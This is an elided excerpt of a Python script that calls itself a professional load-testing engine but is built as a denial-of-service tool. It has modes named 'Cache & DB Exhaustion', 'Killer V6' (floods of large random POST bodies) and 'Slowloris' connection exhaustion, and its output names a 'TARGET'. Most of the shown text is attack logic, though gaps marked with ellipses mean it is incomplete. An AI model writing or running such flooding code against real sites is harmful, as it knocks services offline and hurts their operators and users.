...
# Monster Stres Engine V6 (The Ultimate Edition)
# Professional Grade Load Testing Engine
...
LANG_POOL = ["en-US,en;q=0.9", "id-ID,id;q=0.8,en-US;q=0.7,en;q=0.6", "en-GB,en;q=0.5", "fr-FR,fr;q=0.5"]
...
def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shared_err):
    ...
    RANDOM_POOL = [get_random_string(12) for _ in range(500)]
        ...
        try:
            ...
            while time.time() < end_time:
                ...
                if mode in ['3', '4']:
                    ...
                    curr_path = f"{path}{sep}sb={rnd}&v={random.randint(100,999)}"

                # Mode 4: Killer V6 Logic (High RPS + High Body Payload)
                if mode == '4' and random.random() > 0.4:
                    method = "POST"
                    post_data = get_random_string(random.randint(10000, 60000))
                ...
                if mode == '5':
                    ...
                    while time.time() < end_time:
                        time.sleep(10)
                        s.sendall(f"X-Keep-Alive: {random.randint(1,9999)}\r\n".encode('utf-8'))
...
def main():
    ...
    mode_name = {
        ...
        '3': "CACHE & DB EXHAUSTION", '4': "KILLER V6 (BUFFER OVERFLOW)",
        '5': "SLOWLORIS (CONN EXHAUSTION)"
    }.get(mode, "UNKNOWN")

    print(f"[*] TARGET: {url}\n[*] PROTOCOL: {mode_name}\n[*] CAPACITY: {th_count} SYSTEM PROCESSES\n" + "-"*40)
    sys.stdout.flush()
